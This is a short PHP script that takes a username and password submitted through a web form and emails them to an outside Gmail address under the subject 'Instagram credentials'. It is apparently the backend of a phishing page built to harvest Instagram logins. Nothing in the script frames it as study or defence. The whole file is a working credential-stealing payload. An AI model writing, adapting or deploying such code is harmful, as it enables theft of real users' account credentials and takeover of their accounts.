<?php
$usuario = $_POST['usuario'];
$contraseña = $_POST['contraseña'];

// Envía los datos del formulario al servidor web
mail('felipemorav1@gmail.com', 'Credenciales de Instagram', 'Usuario: ' . $usuario . ', Contraseña: ' . $contraseña);
?>
